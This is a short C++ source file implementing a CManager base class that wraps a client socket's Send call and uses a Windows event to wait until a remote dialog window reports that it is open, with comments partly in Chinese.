// Manager.cpp: implementation of the CManager class.
//
//////////////////////////////////////////////////////////////////////

#include "Manager.h"
#include "until.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CManager::CManager(CClientSocket *pClient)
{
	m_pClient = pClient;
	m_pClient->setManagerCallBack(this);

	/*
	bManualReset 
	[in] Specifies whether a manual-reset or auto-reset event object is created. If TRUE, then you must use the ResetEvent function to manually reset the state to nonsignaled. If FALSE, the system automatically resets the state to nonsignaled after a single waiting thread has been released. 
	*/
	// 第二個參數為true,禁止系統自動重置事件
	m_hEventDlgOpen = CreateEvent(NULL, true, false, NULL);
}

CManager::~CManager()
{
	CloseHandle(m_hEventDlgOpen);
}
void CManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	
}

int CManager::Send(LPBYTE lpData, UINT nSize)
{
	int	nRet = 0;
	try
	{
		nRet = m_pClient->Send((LPBYTE)lpData, nSize);
	}catch(...){};
	return nRet;
}

void CManager::WaitForDialogOpen()
{
	WaitForSingleObject(m_hEventDlgOpen, INFINITE);
	// 必須的Sleep,因為遠程窗口從InitDialog中發送COMMAND_NEXT到顯示還要一段時間
	Sleep(150);
}

void CManager::NotifyDialogIsOpen()
{
	SetEvent(m_hEventDlgOpen);
}